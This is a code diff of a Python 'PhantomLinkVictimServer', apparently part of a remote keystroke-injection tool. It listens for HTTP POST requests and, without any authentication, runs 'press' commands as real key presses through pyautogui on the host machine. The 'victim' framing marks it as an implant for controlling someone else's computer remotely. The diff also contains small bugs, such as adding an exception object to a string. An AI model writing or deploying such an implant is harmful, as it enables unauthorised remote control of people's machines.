@@ -1,13 +1,11 @@
-import keyboard
+import pyautogui
 from http.server import HTTPServer, BaseHTTPRequestHandler
-# ! from collections import defaultdict
+from time import sleep
 
-# ! codes_to_priorities = defaultdict(lambda x : 0)
-# ! codes_to_priorities[200] = 1
-# ! codes_to_priorities[422] = 2
-# ! codes_to_priorities[400] = 3
+def does_key_exist(tested_key):
+    return tested_key.lower() in pyautogui.KEY_NAMES
 
-def try_run_from_phantomscript_command(phantomscript_command: str):
+def try_run_from_phantomscript_command(phantomscript_command: str) -> tuple:
     try:
         phantomscript_command = phantomscript_command.strip().lower()
         splitted_command = phantomscript_command.split(' ')
@@ -17,23 +15,20 @@ def try_run_from_phantomscript_command(phantomscript_command: str):
         # !if opcode in ['//', '#'] or not phantomscript_command:
         # * The code above will not allow comments like this: //fsfd
         if phantomscript_command.startswith(('//', '#')) or not phantomscript_command:
-            return 200
+            return (200, "Successful")
 
         elif opcode == 'press':
-            try:
-                keyboard.press_and_release('+'.join(args))
+            for key in args:
+                if not does_key_exist(key): return (400, f"{key}: Invalid key.")
             
-            except ValueError:
-                # Value is not a key
-                return 422
+            pyautogui.hotkey(args)
 
-            return 200
+            return (200, "Successful.")
 
+        return (422, f" {opcode}: Invalid opcode / command.")
 
-        return 422
-
-    except:
-        return 400
+    except Exception as e:
+        return (400, "An error occured: " + e)
 
 class PhantomLinkVictimServer(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -42,16 +37,24 @@ class PhantomLinkVictimServer(BaseHTTPRequestHandler):
                 payload = self.rfile.read(int(self.headers['Content-Length'])).decode()
                 print(payload)
                 for line in payload.splitlines():
-                    currentStatusCode = try_run_from_phantomscript_command(line)
+                    currentStatusCode, message = try_run_from_phantomscript_command(line)
                     if not str(currentStatusCode).startswith(("4", "3")): continue
                         
                     self.send_response(currentStatusCode)
                     self.end_headers()
-                    return
+                    self.wfile.write(message.encode())
 
 
-            self.send_response(currentStatusCode)
+                self.send_response(currentStatusCode)
+                self.end_headers()
+                self.wfile.write(message.encode())
+
+                return
+
+            self.send_response(400)
             self.end_headers()
+            self.wfile.write(f"{self.path} Invalid path.".encode())
+
 
         except Exception as e:
             self.send_response(400)
